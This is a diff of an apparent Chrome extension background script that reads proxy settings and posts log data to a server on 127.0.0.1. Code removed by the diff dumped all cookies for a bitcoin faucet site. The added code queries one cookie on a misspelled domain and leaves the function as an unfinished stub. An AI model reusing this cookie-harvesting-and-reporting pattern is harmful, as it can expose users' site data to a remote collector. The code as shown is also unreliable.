@@ -1,40 +1,40 @@
+var self;
+
 BackController = function() {
-	this.serverURL = 'http://127.0.0.1';
+	self = this;
+	self.serverURL = 'http://127.0.0.1';
 }
 
 BackController.prototype.log = function(text) {
-	this.getProxy(function (proxy, context) {		
-		context.getAddress(function (address, context) {
+	self.getProxy(function (proxy) {		
+		var logText = proxy + " " + text;
+		self.send({type: 'log', text: logText}, function() {});
+		/*self.getAddress(function (address, context) {
 			var logText = proxy + " " + address + " " + text;
-			alert(logText);
-			context.send({type: 'log', text: logText}, function() {});
-		}, context);
-	}, this);
-}
-
-BackController.prototype.getAddress = function(callback, context) {
-	chrome.cookies.getAll({domain: 'freebitco.in'}, function(cookies) {
-		alert(JSON.stringify(cookies));
-		callback('siski', context);
-		/*for (var i = 0; i < cookies.length; i++)
-			if (cookies[i].name == 'btc_address')
-				callback(cookies[i].value, context);*/
+			self.send({type: 'log', text: logText}, function() {});
+		});*/
 	});
 }
 
-BackController.prototype.getProxy = function(callback, context) {
+BackController.prototype.getAddress = function(callback) {
+	chrome.cookies.getAll({domain: 'freebito.in', name: 'btc_address'}, function(cookies) {
+		// some code here later
+	});
+}
+
+BackController.prototype.getProxy = function(callback) {
 	chrome.proxy.settings.get({}, function(config) {
-		var proxy = config.value.mode;//rules.singleProxy.hostname;
-		callback(proxy, context);
+		var proxy = config.value.mode;//.rules.singleProxy.host;
+		callback(proxy);
 	});
 }
 
 BackController.prototype.send = function(data, callback) {
 	$.ajax({
-		url: this.serverURL,
+		url: self.serverURL,
 		type: 'post',
 		data: data,
-		context: this,
+		context: self,
 		success: callback
 	});
 }
